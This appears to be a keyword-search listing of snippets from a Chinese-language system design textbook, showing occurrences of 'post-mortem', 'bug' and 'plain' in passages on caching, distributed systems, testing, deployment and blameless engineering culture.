  c22_b07.md: ...出，把 Redis 写入负载分散到数秒而非数毫秒。这防止扇出不受控地飙升 Redis 写入吞吐。 * **异步：** `POST /posts` 处理器在写入数据库并发布 Kafka 事件后立即返回。扇出在后台发生。这意味着关注者可能不会立刻看到帖...
  c25_b03.md: ...地。现在我们设计它。   #### 写入路径  每 4 秒，每位活跃司机的移动应用发送一个 HTTP 请求：      POST /driver/{driver_id}/location     { "lat": 37.7749, "lng": -...
  c27_b03.md: ...配置错误导致 45 分钟故障，所有流量被路由到一台服务器。这是 SocialSnap 第一次生产故障，也让团队开始接触 post-mortem（第 28 章详述）。  **技术债务：** 数据库现在成为单一瓶颈——三台应用服务器产生的数据库负载超过...
  c27_b04.md: ...第 16 章：微服务与可靠性（第 24–36 个月）  **它是什么：** 单体分解为服务：User Service、Post Service、Feed Service、Notification Service。加入熔断器。实现优雅降级（若通知服...
  c27_b06.md: ...能。单体继续处理所有其他请求。Notification Service 稳定后，提取 User Service，然后是 Post Service。每次提取都是一个离散、低风险的迁移。  关键纪律：在新系统完全验证前保持旧系统运行。永远不要一次性切换...
  c27_b13.md: ...捕获决策和推理，创造能经受团队流动性的制度记忆。  第 28 章通过考察塑造系统的人文力量来收尾：深入康威定律、无责备 post-mortem 文化、serverless 与边缘计算，以及最终完成的 权衡矩阵（Tradeoff Matrix）——本...
  c28_b02.md: ...前，CTO 围绕预期的服务边界重组团队。Feed Team、User Team、Notification Team 和 Post Team 成立。然后，每个团队的第一个项目就是从单体中提取自己的服务。最终的服务与团队边界干净地映射——因为团队结构正...
  c28_b02.md: ...组织实际结构不匹配的人为划分。反过来读康威定律，可以诊断组织失调。  * * *   ### 28.2 On-Call、Post-Mortem 与无责备文化...
  c28_b03.md: ...良好运行的 on-call 轮值把可操作页面限制在每次轮班 2–3 次；非可操作噪音被积极消除。   #### 无责备 Post-Mortem  系统事件发生时，人类有一种自然的冲动去找过错方。部署了错误代码的工程师。没注意到警示信号的运营团队。这...
  c28_b03.md: ...历事件的工程师——因此对发生了什么理解最深——如果担心个人后果，就不会完整分享知识。组织失去了学习机会。  **无责备 post-mortem** 是由 SRE 团队（Site Reliability Engineering，Google 发展起来...
  c28_b03.md: ...E 团队（Site Reliability Engineering，Google 发展起来的学科）开创的文化实践。原则：post-mortem 分析系统和流程，而非个人。问题从来不是“谁造成的？”，而是“什么条件使这次失败成为可能？”  好的 po...
  c28_b03.md: ...st-mortem 分析系统和流程，而非个人。问题从来不是“谁造成的？”，而是“什么条件使这次失败成为可能？”  好的 post-mortem 回答：  1. 发生了什么？（尽可能详细的时间线） 2. 对用户影响是什么？（持续时间、范围、受影响数量...
  c28_b03.md: ...它？（检测改进） 5. 什么能预防它？（预防性变更） 6. 行动项是什么？（具体、有人负责、有日期的系统或流程变更）  post-mortem 在组织内广泛分享，行动项被跟踪到完成。目标是制度学习：每次事件都使系统更安全，因为每次事件的教训都被编码...
  c28_b03.md: ...良好运行的 on-call 轮值把可操作页面限制在每次轮班 2–3 次；非可操作噪音被积极消除。   #### 无责备 Post-Mortem  系统事件发生时，人类有一种自然的冲动去找过错方。部署了错误代码的工程师。没注意到警示信号的运营团队。这...
  c28_b03.md: ...历事件的工程师——因此对发生了什么理解最深——如果担心个人后果，就不会完整分享知识。组织失去了学习机会。  **无责备 post-mortem** 是由 SRE 团队（Site Reliability Engineering，Google 发展起来...
  c28_b03.md: ...E 团队（Site Reliability Engineering，Google 发展起来的学科）开创的文化实践。原则：post-mortem 分析系统和流程，而非个人。问题从来不是“谁造成的？”，而是“什么条件使这次失败成为可能？”  好的 po...
  c28_b03.md: ...st-mortem 分析系统和流程，而非个人。问题从来不是“谁造成的？”，而是“什么条件使这次失败成为可能？”  好的 post-mortem 回答：  1. 发生了什么？（尽可能详细的时间线） 2. 对用户影响是什么？（持续时间、范围、受影响数量...
  c28_b03.md: ...它？（检测改进） 5. 什么能预防它？（预防性变更） 6. 行动项是什么？（具体、有人负责、有日期的系统或流程变更）  post-mortem 在组织内广泛分享，行动项被跟踪到完成。目标是制度学习：每次事件都使系统更安全，因为每次事件的教训都被编码...
  c28_b15.md: ...持独立扩展 | 服务间最终 | 更高——部分失败隔离 | 极高——需要服务 owning 模型 **Blameless post-mortems** (Ch 28) | N/A | N/A | 随时间改善（从失败中学习） | 低——只需流程纪律 *...
  c28_b17.md: ...需要 2 周（2 weeks）。第一周用于阅读：服务大纲、权衡矩阵（Tradeoff Matrix）、过去 6 个月的 post-mortem。第二周与资深工程师配对完成第一次 on-call 轮值。到第二周末，新员工至少参与过一次生产事件——不是...
  c28_b19.md: ...于它们之间数据流的一致性——正是第 7 章提到的缓存失效问题，计算机科学中最难的问题之一。  **Q4.** 是什么让 post-mortem “无责备”，为什么这种文化选择比聚焦责备的事件审查产生更好的工程结果？  **答案：** 无责备 pos...
  c28_b19.md: ...ost-mortem “无责备”，为什么这种文化选择比聚焦责备的事件审查产生更好的工程结果？  **答案：** 无责备 post-mortem 关注系统条件和流程失败，而非个人错误。它问“什么条件使这次失败成为可能？”而不是“谁犯了错？”无责备：“...
  c28_b19.md: ...错误代码部署到生产。”无责备产生更好结果，因为：(1) 害怕责备的工程师会隐藏信息。在责备文化中，犯错的工程师有动机在 post-mortem 中淡化或掩盖自己的角色。在无责备文化中，他们是最有价值的贡献者——他们拥有最详细的知识。完整信息带来更好...
  c28_b21.md: ...但是可行的。退出策略良好。6. 还有谁在规模上运行？TimescaleDB 已被多家大公司大规模使用。公开的案例研究和 post-mortem 可获得。建议：采纳 TimescaleDB。它解决真实问题，故障模式可接受，运营 familiar，退出...
  c28_b21.md: ...移意外删除了 `posts` 表上的索引，导致每个 feed 查询执行全表扫描。用五个为什么技术追溯根本原因。然后撰写 post-mortem 的行动项，确保每项都处理系统性条件而非归咎于个人。...
  c28_b22.md: ...询计划影响。根本原因：CI/CD 流水线中没有自动查询计划回归测试；staging 无法验证关键索引查询在迁移后仍高效。post-mortem 行动项：(1) **在 CI/CD 中添加查询计划回归测试**（负责：Platform 团队，期限：2...
  c28_b23.md: ...队协调。通信需求在接口明确稳定时降低。在接口文档、API 版本管理和事件 schema 管理上的投资会带来持续协调减少。post-mortem 实践也在这里有贡献：制度记忆（记录在 post-mortem 和 ADR——Architecture D...
  c28_b24.md: ...处方：先按你想构建的架构设计组织。SocialSnap 在微服务迁移前的团队重组就是这一原则的有意应用。  **无责备 post-mortem** 和 on-call 文化决定团队如何从失败中学习。把失败视为系统问题而非个人问题的文化以复利速度积累...
  intro.md: ...构，审视人的层面：Conway's Law（康威定律）如何意味着组织架构无论你是否愿意都会塑造系统，blameless post-mortems（无追责事后复盘）为何是可靠性机制而非管理仪式，以及 Inverse Conway Maneuver（逆...

=== bug (71 occurrences) ===
  c01_b04.md: ...放不下。你必须把数据库拆到多台机器上——但跨机器的 SQL JOIN 慢得灾难。你的部署流程要花一小时。生产环境的一个 bug 几分钟内影响 1 亿人。每个工程决策现在都有复合后果（compounding consequences）。  注意发生...
  c01_b05.md: ...**机器是可靠的。** 理论运行在理想化的机器上，它正确执行指令。真实机器会耗尽磁盘空间、固件（firmware）有 bug、发生内核崩溃（kernel panics），甚至在数据中心（datacenter）火灾中被物理摧毁。  **存在一份权...
  c01_b07.md: ...，它们协同工作以完成一个目标。程序是自包含的；系统有明确的接口、边界以及各部分之间的交互。关键的实际差异：程序在代码有 bug 时失败；而系统即使在所有代码都正确时也可能失败（因为网络可能故障、机器可能崩溃、依赖可能变慢）。系统设计就是处理那些不...
  c01_b07.md: ...失败；而系统即使在所有代码都正确时也可能失败（因为网络可能故障、机器可能崩溃、依赖可能变慢）。系统设计就是处理那些不是 bug 的失败的学科。  **Q2.** 说出服务 100 万用户的系统与服务 100 用户的系统在性质上（而不只是在数量上）...
  c04_b01.md: ...服务器无法逃避一个问题：当它们彼此无法通信时会发生什么？  网络会失败。不是假设——是经常。交换机故障、网线被拔、软件 bug 导致网络分区。在任何足够大的分布式系统中，任何时刻总有一些组件无法与另一些组件通信。这不是你能通过工程消除的故障模式。...
  c04_b07.md: ...就是任何规模化系统——都会经历某些机器无法到达其他机器的网络故障。这些故障可能由交换机故障、网线被切断、网络路由器软件 bug 或故意隔离（如数据中心维护）引起。没有工程技术能保证真实网络永不分区。一个假设不分区的理论系统必须是单台机器、没有网络...
  c07_b08.md: ...#### 第一个陈旧性 Bug  SocialSnap v2 上线后表现很好。数据库负载大幅下降，延迟改善，原本会压垮 v1 的病毒式流量尖峰现在被缓...
  c07_b08.md: ...2 上线后表现很好。数据库负载大幅下降，延迟改善，原本会压垮 v1 的病毒式流量尖峰现在被缓存吸收。  但随后收到一个 bug 报告。用户 Carlos 在 14:07 更新了他的简介。他的朋友 14:08 访问他的资料，看到的是旧简介。到 14...
  c07_b08.md: ...介。他的朋友 14:08 访问他的资料，看到的是旧简介。到 14:13（TTL 过期后），所有人都看到新简介。  这是 bug 吗？严格来说，缓存按设计工作。`update_user_profile` 函数在资料更新时会使缓存失效。但报告揭示了一...
  c07_b08.md: ...用使用不同的代码路径，它更新了数据库但没有使 Redis 缓存失效。  这是 SocialSnap 历史上第一个陈旧性 bug。但不会是最后一个。  修复办法是确保所有修改用户数据的代码路径都使相关缓存 key 失效。但这次事故揭示了关于缓存的基...
  c07_b08.md: ...y 失效。但这次事故揭示了关于缓存的基本事实：**给系统加缓存不只是性能改动——它是一项架构改动，会创造一类新的正确性 bug。** 任何写入数据库的代码路径都必须同时管理缓存状态。  这就是为什么工程师有时说计算机科学只有两个难题：缓存失效和命...
  c07_b08.md: ...#### 第一个陈旧性 Bug  SocialSnap v2 上线后表现很好。数据库负载大幅下降，延迟改善，原本会压垮 v1 的病毒式流量尖峰现在被缓...
  c07_b08.md: ...2 上线后表现很好。数据库负载大幅下降，延迟改善，原本会压垮 v1 的病毒式流量尖峰现在被缓存吸收。  但随后收到一个 bug 报告。用户 Carlos 在 14:07 更新了他的简介。他的朋友 14:08 访问他的资料，看到的是旧简介。到 14...
  c07_b08.md: ...介。他的朋友 14:08 访问他的资料，看到的是旧简介。到 14:13（TTL 过期后），所有人都看到新简介。  这是 bug 吗？严格来说，缓存按设计工作。`update_user_profile` 函数在资料更新时会使缓存失效。但报告揭示了一...
  c07_b08.md: ...用使用不同的代码路径，它更新了数据库但没有使 Redis 缓存失效。  这是 SocialSnap 历史上第一个陈旧性 bug。但不会是最后一个。  修复办法是确保所有修改用户数据的代码路径都使相关缓存 key 失效。但这次事故揭示了关于缓存的基...
  c07_b08.md: ...y 失效。但这次事故揭示了关于缓存的基本事实：**给系统加缓存不只是性能改动——它是一项架构改动，会创造一类新的正确性 bug。** 任何写入数据库的代码路径都必须同时管理缓存状态。  这就是为什么工程师有时说计算机科学只有两个难题：缓存失效和命...
  c07_b10.md: ...效可用性（容量 20% 的数据库远比 99% 容量的可用性高）。但它增加运维复杂度：你现在要多运维一个系统、多担心一类 bug、还要维护缓存失效逻辑。  这个 tradeoff（权衡）值得吗？对 SocialSnap 来说，值得——读密集型工作负...
  c07_b17.md: ...工具之一——也最具欺骗性。它看起来简单：存储答案，快速提供。但缓存从根本上改变了系统的正确性模型，引入了陈旧数据和失效 bug 的可能性，这些问题可能比性能问题更 damaging。  本章关键概念：  **缓存命中率**是主要性能杠杆。90%...
  c07_b17.md: ...和后台刷新是缓解手段。  SocialSnap v2 加入了 Redis 缓存层，显著降低数据库负载。它的第一个陈旧性 bug 说明，缓存不只是性能改动——它产生需要仔细失效逻辑的新一类正确性问题。  权衡矩阵中缓存这一行捕捉了核心交易：以更好延...
  c08_b15.md: ...12 月 31 日即可。在传统 CRUD 系统中，这需要一个单独的“余额历史”表——手动实现事件溯源自动提供的东西。  Bug 恢复更安全：如果 bug 导致错误计算，你可以修复计算逻辑并重放所有事件以得到正确当前状态。在 CRUD 系统中，写入...
  c08_b15.md: ...传统 CRUD 系统中，这需要一个单独的“余额历史”表——手动实现事件溯源自动提供的东西。  Bug 恢复更安全：如果 bug 导致错误计算，你可以修复计算逻辑并重放所有事件以得到正确当前状态。在 CRUD 系统中，写入数据库的错误状态可能无法恢...
  c08_b15.md: ...**反对事件溯源的理由：**  学习曲线陡峭。大多数开发者熟悉 CRUD。事件溯源需要根本不同的心智模型。事件模型中的 bug 微妙且难诊断。对时间紧、团队小的初创公司，这种学习投入可能令人望而却步。  当前状态查询要么需要重放事件（大规模时慢）...
  c08_b15.md: ...与新事件同步”。投影方法给每个事件加了预写日志（CQRS 模式），使写入路径复杂度翻倍。  修正事件在哲学上尴尬。如果 bug 导致错误事件被追加到日志，你不能简单删除它（日志只追加）。你必须追加补偿事件。对正确性至上的金融应用，管理补偿事件需要...
  c08_b15.md: ...12 月 31 日即可。在传统 CRUD 系统中，这需要一个单独的“余额历史”表——手动实现事件溯源自动提供的东西。  Bug 恢复更安全：如果 bug 导致错误计算，你可以修复计算逻辑并重放所有事件以得到正确当前状态。在 CRUD 系统中，写入...
  c08_b15.md: ...传统 CRUD 系统中，这需要一个单独的“余额历史”表——手动实现事件溯源自动提供的东西。  Bug 恢复更安全：如果 bug 导致错误计算，你可以修复计算逻辑并重放所有事件以得到正确当前状态。在 CRUD 系统中，写入数据库的错误状态可能无法恢...
  c08_b15.md: ...**反对事件溯源的理由：**  学习曲线陡峭。大多数开发者熟悉 CRUD。事件溯源需要根本不同的心智模型。事件模型中的 bug 微妙且难诊断。对时间紧、团队小的初创公司，这种学习投入可能令人望而却步。  当前状态查询要么需要重放事件（大规模时慢）...
  c08_b15.md: ...与新事件同步”。投影方法给每个事件加了预写日志（CQRS 模式），使写入路径复杂度翻倍。  修正事件在哲学上尴尬。如果 bug 导致错误事件被追加到日志，你不能简单删除它（日志只追加）。你必须追加补偿事件。对正确性至上的金融应用，管理补偿事件需要...
  c10_b14.md: ...dis 缓存仍有旧 URL。用户在 TTL 分钟内会看到旧照片。这正是 SocialSnap 在第 7 章遇到的陈旧性 bug。缓解：重试缓存失效；使用短 TTL 作为安全网（即使失效失败，旧 URL 缓存最终也会过期）。  **第 4 步（异步...
  c10_b15.md: ...。如果 Redis 失效失败（网络闪断），资料缓存会在最多 TTL 分钟内继续服务旧 URL——这是第 7 章的陈旧性 bug 模式。  **4. CDN 对旧图片 URL 的缓存：** 由于旧 URL（`profile_photo_v3.jpg...
  c11_b01.md: ...置为轮询：请求 1 到 A，请求 2 到 B，请求 3 到 C，请求 4 再回到 A。  部署看起来成功。但不到一小时，bug 报告开始出现。  “我一直被登出。”“我每点一个页面都得重新登录。”“有时候我登录着，下一秒又登出了。”  发生了什么...
  c11_b01.md: ...录。”“有时候我登录着，下一秒又登出了。”  发生了什么？   ### 11.1 会话问题——隐藏的状态  要理解这个 bug，需要先理解登录会话如何工作。  当用户登录（提交用户名和密码）时，服务器验证凭据并创建一个**会话（session）*...
  c11_b11.md: ...每个客户端状态。任何服务器都能处理任何请求。  **Q2.** 描述 SocialSnap v4 初始部署中的会话管理 bug。根本原因是什么，修复是什么？  **答案：** 当 SocialSnap 在轮询负载均衡器后增加三台应用服务器时，用户...
  c11_b13.md: ..., ttl=300)         return profile   找出在三台服务器部署中该实现的问题。它导致哪类 bug，应如何修复？...
  c11_b14.md: ...务器部署中，每台服务器有自己的独立缓存。这违反无状态要求——每台服务器持有未与同伴共享的状态（缓存的资料数据）。  **bug 类别：缓存失效不一致。** 当 Alice 更新资料时：  1. 更新请求由 Server A 处理。 2. Serv...
  c11_b16.md: ...则运行时间为 99.9%。但：服务器故障时（0.1% 的时间）系统完全故障。而且它是单点故障——一次硬件故障、一个软件 bug、一次坏部署就会让整个系统宕机。  **无状态分布式情况：**  多台应用服务器 + Redis + 数据库 + 对象存...
  c13_b11.md: ...ice）。  **用户认证**——非常适合作独立服务，主要不是为了扩展而是为了安全。认证敏感；隔离它意味着帖子服务中的 bug 不会直接危及认证逻辑。认证服务也通常是所有其他服务共享的基础设施（每个请求都必须认证）。  **Q2.** 服务 A...
  c13_b12.md: ...两条路径一段时间（几天或几周）。监控旧路径和新路径创建的通知差异。修复 Notification Service 中的 bug。  **第 5 步：移除旧直接数据库访问。** 确信 Notification Service 正确后，从帖子创建代码...
  c16_b01.md: ...含地以成功为前提。请求到达并被处理。数据库接受写。服务响应。网络投递数据包。队列排空。  系统会失败。硬件会坏。软件有 bug。网络会分区。数据中心会断电。DNS 提供商会出故障。依赖项有自己的依赖项，它们随时可能失败。  SocialSnap...
  c17_b04.md: ...DEBUG。 3. **Service and version**——哪个服务产生这条日志，以及运行代码的哪个版本。当 bug 部署然后修复后，你需要把日志事件与代码版本关联。 4. **Request ID（trace ID）**——每个用户请...
  c17_b10.md: ...热）而没有任何用户影响，产生误报。(2) CPU 低不能保证服务良好——服务可能有 20% CPU 但因返回错误很快的 bug 而完全失败。(3) 它不直接测量用户体验。更好的替代是告警“错误率超过 1%”或“p99 延迟超过 SLO 阈值”——...
  c18_b01.md: ...系统而不破坏它？  第 16 章的熔断器防止级联故障。第 17 章的可观测性栈告诉你何时出问题。但如果自己部署了带微妙 bug 的代码而破坏系统，两者都帮不上忙。你需要一种纪律，在影响所有用户之前验证变更；还需要一种策略，在变更不可避免地造成问题...
  c18_b01.md: ...连接后以意外方式交互的组合行为  这不是单元测试的失败——单元测试正在做它承诺的事。问题是，导致生产 outage 的 bug 往往不是单个函数中的 bug。它们是**组件间交互**中的 bug：超时配置太长、重试在 outage 期间放大负载、...
  c18_b01.md: ...这不是单元测试的失败——单元测试正在做它承诺的事。问题是，导致生产 outage 的 bug 往往不是单个函数中的 bug。它们是**组件间交互**中的 bug：超时配置太长、重试在 outage 期间放大负载、缓存失效顺序错误、分布式事务让...
  c18_b01.md: ...在做它承诺的事。问题是，导致生产 outage 的 bug 往往不是单个函数中的 bug。它们是**组件间交互**中的 bug：超时配置太长、重试在 outage 期间放大负载、缓存失效顺序错误、分布式事务让数据处于半提交状态。  这些 bug...
  c18_b01.md: ...bug：超时配置太长、重试在 outage 期间放大负载、缓存失效顺序错误、分布式事务让数据处于半提交状态。  这些 bug 需要不同的测试策略。...
  c18_b02.md: ...——在真实流量水平下测试系统行为 6. **混沌测试**——以受控方式测试依赖失败时的系统行为  每一层捕获不同类别的 bug。针对真实 PostgreSQL 实例的服务集成测试能捕获“这条 SQL 查询在 SQLite 单元测试中通过，但在 P...
  c18_b02.md: ...试覆盖率 95% 但没有集成测试的代码库，可能在每次数据库交互、每次 API 响应解析、每次超时配置中都存在未检测到的 bug。覆盖率衡量测试期间执行了多少代码，而不是测试了多少失败模式。   ### 18.2 集成与负载测试——测试交互   #...
  c18_b02.md: ...发 HTTP 请求 6. 断言响应  这种测试比单元测试慢得多——可能 5–30 秒——但它捕获单元测试完全遗漏的一类 bug：真实数据库查询 bug、真实序列化错误、真实认证流程问题。  集成测试应在 CI（持续集成）中运行——每次 pull...
  c18_b02.md: ...断言响应  这种测试比单元测试慢得多——可能 5–30 秒——但它捕获单元测试完全遗漏的一类 bug：真实数据库查询 bug、真实序列化错误、真实认证流程问题。  集成测试应在 CI（持续集成）中运行——每次 pull request 自动运行...
  c18_b06.md: ...金丝雀部署是大规模系统的主导部署策略，因为它在有限影响范围内提供生产环境的经验验证。如果新版本只在生产条件下才暴露 bug，最多只影响 5% 用户，团队可以诊断并回滚。...
  c18_b07.md: ...算法按反向时间顺序展示帖子。新算法用参与预测模型重新排序 feed，把模型预测用户最可能参与的帖子放在前面。  这不是 bug 修复——而是影响不确定的产品变更。团队无法预测新算法会提高参与率、降低参与率，还是产生意外边界情况。他们以金丝雀方式部...
  c18_b09.md: ...p 时间）、代码复杂度（功能开关）、工程时间（混沌工程）。选择取决于变更的风险画像和做错的成本。  对非关键端点的一行 bug 修复，可能不需要金丝雀。对改变每个用户 feed 体验的新排序算法，绝对需要。   ### 18.6 练习...
  c18_b10.md: ...试很危险，因为它们侵蚀对测试套件的信任。工程师学会重新运行失败测试而不是调查失败，因为“可能只是不稳定测试”。当真正的 bug 导致真正测试失败时，它会被重跑并可能碰巧通过——让缺陷到达生产。文化后果比技术后果更糟：频繁误失败的 CI 流水线教会...
  c18_b10.md: ...用户看到新版本，如果他们指标良好，再 5%，然后 10%，等等。风险是渐进的：任何时刻，最多 X% 用户暴露于新版本 bug。回滚意味着对新版本路由 0% 流量。蓝绿更适合需要在暴露任何用户前在全生产规模测试的变更（例如性能敏感变更）。金丝雀更...
  c18_b14.md: ...额外风险都不可接受。  “不做更不负责任”论点最强时：(a) 生产失败无论如何都会发生——硬件会坏、网络会分区、依赖有 bug——唯一问题是你通过受控实验还是意外事件发现失败模式；(b) 系统已有良好可观测性（第 17 章）和熔断器（第 16 章...
  c18_b15.md: ...律。单元测试验证个体逻辑。集成测试验证组件交互。负载测试验证流量下行为。混沌测试验证失败下行为。每一层捕获其他层遗漏的 bug。  部署策略——蓝绿、金丝雀、功能开关——是风险管理工具。蓝绿提供瞬时回滚。金丝雀把影响范围限制在少部分用户。功能开关...
  c19_b01.md: ...到目前为止我们讨论的每一种失败都是无意的。硬件失败是因为零件磨损。软件崩溃是因为 bug。网络分区是因为配置错误。级联是因为意外交互。系统不是想失败——它尽管每个人都尽最大努力防止，还是失败了。  安全失败不...
  c19_b02.md: ...s。他们无法删除数据、修改账户或访问支付记录。  最小权限不是不信任自己的服务。它是限制出错时的影响范围——无论原因是 bug、入侵还是配置错误。权限最少的服务在异常时只能造成最小损害。   #### 常见误解  最常见误解是认证和授权通常合二为...
  c21_b10.md: ...障。  **v2（第 7 章）：** 加入 Redis 缓存用于资料查找。首次尝到缓存降低延迟的甜头——也出现首个陈旧 bug：用户更新资料后一小时内 feed 仍显示旧版本。加入基于 TTL 的失效作为修复。  **v3（第 8 章）：** 加...
  c21_b10.md: ...显著更 resilient。  **v4（第 11 章）：** 水平扩展加入三台应用服务器。首个分布式 session bug：session 存在某台服务器，用户下一请求被另一台处理时却登录了。通过把 session 移到 Redis 修复。无...
  c27_b02.md: ...第 3–6 个月）  **它是什么：** Redis 作为缓存层引入。Profile 查找带 TTL 缓存。第一次陈旧 bug：用户更新了用户名，但缓存版本最多 60 秒仍显示旧名。  **关键决策：**  * Cache-aside 模式：应用...
  c27_b02.md: ...：** 缓存失效策略不一致——某些写路径在写入时失效缓存，另一些没有。三个月内，团队遇到影响约 3% 用户的缓存不一致 bug（编辑后用户仍看到旧 profile 数据）。  **调试教训：** 团队花了三天调试这个缓存不一致。修复后，他们确立规...
  c27_b02.md: ...*技术债务：** Worker 任务失败开始静默。团队没有对队列深度或任务失败率做充分监控。两周内，一个 subtle bug 导致 15% 欢迎邮件静默失败——团队直到有用户发邮件给客服问为什么没收到欢迎邮件才发现。  **监控教训：** 每个...
  c27_b03.md: ...片）。团队本应从一开始就使用一致性哈希——但当时他们还不知道。  **变革信号：** 单体变得难以部署——通知代码中的 bug 需要部署整个应用，包括关键 feed API。部署时间 15 分钟；部署期间系统降级。...
  c27_b06.md: ...爆炸重写**：关闭旧系统，构建新系统，切换。这几乎从不奏效。大爆炸重写以超出预算、超出时间著称，并且会复制被替代系统的 bug（因为团队正在重新学习旧系统隐式处理的所有边界情况）。  替代方案是 **strangler fig** 模式：让新系统...
  c27_b07.md: ...码库提交，每个人都了解整个系统，部署协调。  50 名工程师跨 6 个团队：单体成为瓶颈。团队相互阻塞部署；一个团队有 bug 的部署破坏另一个团队的服务。架构必须沿团队边界分解。  SocialSnap 的微服务分解（v6）既是组织需要，也是技...
  c27_b09.md: ...队共享单体，代码库变成协调问题——任何需要破坏性变更的团队都会阻塞所有 8 个团队，部署计划必须同步，一个团队代码中的 bug 可能影响所有团队的服务。系统结构必须与组织沟通结构匹配。8 个团队时，自然架构是 8 个服务——每个团队一个——之间有...
  c28_b02.md: ...为了产生这种架构而设计的。  这一机动有一个识别架构问题的推论：如果系统在特定接口处长期存在集成问题——跨越两个组件的 bug、需要同时改变两者的性能问题、突破所谓清晰边界的安全事件——调查团队结构是否也跨越了同一边界。两个组件之间接口处的混乱架...
  c28_b02.md: ...间接口处的混乱架构往往反映了同一边界上团队沟通的混乱。   #### 常见误解  关于康威定律的一个常见误解是它是一种 bug——需要克服的东西。事实上，它是一个有用的信号。感觉自然且易于维护的架构边界通常反映了真实的组织边界。不断被违反的架构边...
  c28_b16.md: ...不同工程师有不同经验。** 运维过 Cassandra 集群的工程师知道只读过文档的工程师不知道的故障模式。调试过缓存 bug（SocialSnap v2）的工程师对缓存失效复杂度有一种直觉，任何教科书都无法完全传达。  **良好设计需要对抗性挑...
  c28_b18.md: ...少沟通，计费系统和产品系统通常会有 poorly designed 集成——每方对另一方的约束和需求只有模糊理解，集成 bug 出现在与沟通缺口匹配的接口上。  **Q2.** Serverless（FaaS）与传统基于服务器的部署有何关键区别？...

=== plain (70 occurrences) ===
  c04_b01.md: ...，或返回错误。更精确地说：系统的行为就好像只有一份数据副本，所有操作都按某种尊重操作真实时间顺序的顺序原子地发生。   plain 语言：如果你写入一个值，然后读取它（或任何人在系统任何地方读取它），你总是能看到这次写入被反映出来。系统看起来对每个数...
  c04_b01.md: ...AP）  **可用性** 意味着每个发往非失败节点的请求都会收到响应（不是错误）。响应可能不是最新值，但它不是错误。  plain 语言：系统总是响应。它可能给你旧数据，但不会说“我不知道，请重试。”  注意这个微妙之处：可用性并不意味着数据正确。它...
  c04_b02.md: ...：分区容错性  **分区容错性** 意味着当网络分区发生时——即节点之间的消息被任意延迟或完全丢失——系统继续运行。  plain 语言：即使某些节点无法与其他节点通信，系统仍继续运行。  现在来看关键观察：**在任何真实的分布式系统中，你必须具有分...
  c04_b02.md: ...nsistency）、可用性（Availability）和分区容错性（Partition Tolerance）。**  plain 语言：当分布式系统中的机器无法相互通信（网络分区）时，你必须做出选择——要么停止响应以保持正确性，要么继续响应并可能返...
  c04_b03.md: ...：** 分区期间，牺牲可用性或一致性（与 CAP 相同） * **ELC：** 否则（正常运行时），牺牲延迟或一致性  plain 语言：即使网络工作正常，强一致性也要付出延迟代价。要保证每次读都看到最新写，你必须在返回前跨所有副本协调——而协调需要...
  c05_b01.md: ...（Structured Query Language，结构化查询语言）查询，SQL 可以组合、过滤、聚合多张表的数据  plain 语言：数据存在表里，表之间通过共享 ID 关联，你用 SQL 向数据提问。...
  c05_b04.md: ...单元的数据库操作——它们要么全部成功，要么全部失败。一个事务可以包含多次读和写，数据库保证它们作为一个原子整体完成。  plain 语言：事务保证一个多步操作要么完全完成，要么不留下任何痕迹。没有“半完成”状态会被其他用户看到。  考虑 Social...
  c05_b04.md: ...#### ACID 性质  关系型数据库中的事务保证四个性质，合称 **ACID**：   #### 定义：ACID  plain 语言：ACID 是一套让数据库对关键数据安全的保证——每个操作要么全有要么全无，每个操作都保持已定义规则，并发操作互不...
  c05_b04.md: ...ad logging）实现的：数据库在应用事务前先把它意图记录到磁盘日志文件，这样重启后可以重演或回滚未完成的事务。  plain 语言：  * 原子：要么全有，要么全无 * 一致：没有无效状态 * 隔离：事务互不干扰 * 持久：已提交数据在崩溃后幸...
  c06_b06.md: ...最终一致（Eventually consistent）：** 如果没有新写入，系统最终会在所有副本上收敛到一致状态。  plain 语言：BASE 系统优先保证可用性而非正确性，把临时不一致作为保持可用的代价。  BASE vs ACID 不仅是技术...
  c06_b08.md: ...文档存储可能吃力。许多 CRM 对在线应用用文档存储，再同步数据到关系型数据库或数据仓库做分析。  **Q2.** 用 plain 语言解释为什么图数据库能高效处理多跳遍历而关系型数据库不能。使用每种数据库物理上如何查找相关数据的概念。  **答案：...
  c07_b01.md: ...equently accessed 数据的副本，以便未来请求该数据时比从原始来源（通常是数据库或外部服务）取回更快。  plain 语言：缓存是一个记事本。你不用每次都重新计算，把答案写下来。下次有人问，你直接读记事本。记事本比重新计算快——但如果底...
  c07_b02.md: ...缓存而非底层数据库服务的请求占比：       命中率 = 缓存命中次数 / (缓存命中次数 + 缓存未命中次数)   plain 语言：如果 100 个请求中有 90 个从缓存服务、10 个需要数据库查询，命中率就是 90%。  为什么命中率如此重...
  c07_b04.md: ...个时长，超过该时长后缓存条目自动视为过期并从缓存中移除。客户端请求过期条目时，缓存返回未命中，应用重新取回新鲜数据。  plain 语言：TTL 是缓存数据的过期日期。5 分钟（或 1 小时、1 天——由你选择）后，缓存值被丢弃，下一次请求会拉取新鲜...
  c07_b11.md: ...%，未命中降到 100/秒——在数据库能力范围内。命中率每提升一个百分点带来的价值与流量成正比。  **Q2.** 用 plain 语言解释 cache-aside、write-through 和 write-behind 缓存的区别。各举一个最适合...
  c08_b02.md: ...或任务的离散数据单元）。队列把生产者与消费者解耦：生产者不需要知道谁处理它们的消息，消费者也不需要知道谁生产了消息。  plain 语言：消息队列是系统的待办清单。生产者往清单加任务。消费者按自己的节奏处理清单。即使生产者或消费者暂时离线，清单依然存...
  c08_b04.md: ...（**订阅者，subscribers**）订阅特定主题并接收发布到该主题的每条消息。一条发布的消息投递给所有订阅者。  plain 语言：pub-sub 像报纸。报纸（发布者）印一版。每个订阅者都得到该版副本。订阅者互不知晓；他们只知道报纸。  So...
  c08_b10.md: ...用户立即认证，审计记录后台写入。如果审计系统暂时慢，用户登录不会被延迟。  **Q2.** 三种消息投递保证是什么？用 plain 语言解释每种含义，并说明每种在故障场景下会发生什么。  **答案：**  **最多一次：** 消息被投递零次或一次——...
  c09_b01.md: ...收 incoming 请求并将其分发给一组后端服务器的组件，目标是最大化吞吐、最小化延迟，并避免压垮任何单台服务器。  plain 语言：负载均衡器是服务器农场门口的交警。每个请求先到负载均衡器。负载均衡器决定哪个服务器处理它，然后把请求转发过去。...
  c09_b04.md: ...：缓存节点和缓存 key 都映射到一个概念环（哈希空间）上的位置。每个 key 存在从它所在位置顺时针第一个节点上。  plain 语言：想象一个从 0 到 2^32-1 的圆形数轴（32 位哈希空间）。每个缓存节点按节点名哈希放在环上某个位置。每个...
